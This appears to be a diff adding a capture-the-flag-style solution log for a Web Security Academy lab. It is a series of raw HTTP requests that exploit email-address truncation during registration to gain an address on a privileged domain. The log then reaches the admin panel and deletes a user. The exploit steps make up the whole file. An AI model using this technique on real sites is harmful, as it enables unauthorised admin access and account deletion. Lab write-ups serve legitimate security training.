@@ -1,0 +1,33 @@
+POST /register HTTP/1.1
+
+csrf=x5fC0VQsocuJSratgsm995rFxm86Ot8I&username=wiener5&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%40exploit-acc31f9b1e5fa17fc06a535401700002.web-security-academy.net&password=peter
+
+GET /email HTTP/1.1
+
+GET /register?temp-registration-token=dKWbGSFuGI1GNNvRIlulxwzVMsUOV2gd HTTP/1.1
+
+POST /login HTTP/1.1
+
+csrf=x5fC0VQsocuJSratgsm995rFxm86Ot8I&username=wiener5&password=peter
+
+GET /my-account HTTP/1.1
+
+$ for i in {1..$((266 - 11 - 17))}; do echo -n a; done
+
+POST /register HTTP/1.1
+
+csrf=xgypLz1aMyWWTNZsZxxPyZPd7FR6yC8r&username=wiener6&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%40dontwannacry.com.exploit-acc31f9b1e5fa17fc06a535401700002.web-security-academy.net&password=peter
+
+GET /email HTTP/1.1
+
+GET /register?temp-registration-token=BCt0x3JBFWKxEepPeGWGwThjiafi3sfd HTTP/1.1
+
+POST /login HTTP/1.1
+
+csrf=xgypLz1aMyWWTNZsZxxPyZPd7FR6yC8r&username=wiener6&password=peter
+
+GET /my-account HTTP/1.1
+
+GET /admin HTTP/1.1
+
+GET /admin/delete?username=carlos HTTP/1.1
